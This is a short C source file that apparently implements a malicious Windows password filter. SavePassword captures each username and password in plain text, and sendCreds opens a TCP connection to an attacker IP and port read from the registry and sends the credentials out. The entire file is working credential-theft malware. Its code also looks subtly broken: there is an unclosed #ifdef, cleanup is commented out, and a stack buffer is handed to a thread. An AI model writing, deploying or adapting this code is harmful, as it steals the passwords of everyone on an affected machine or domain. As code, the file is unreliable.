#include "winfilter.h"

void sendCreds(char* creds)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* ip = getIPReg("ipa");
	DWORD port = getPtReg();
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return; } 

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { goto end; }

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { goto end; }

	if (send(s, creds, strlen(creds), 0) < 0) { goto end; }

end:
	// free(ip);
	// WSACleanup();
	return;
}

void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	char user[50];
	char pass[50];
	char creds[150];

	wcstombs(user, username->Buffer, sizeof(user));
	wcstombs(pass, password->Buffer, sizeof(pass));

	char* eip = getIPReg("eip");
	snprintf(creds, sizeof(creds), "%s\x11%s\x12%s\x13", user, pass, eip);
	free(eip);

#ifdef LSA
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
#else
	sendCreds(creds);
}
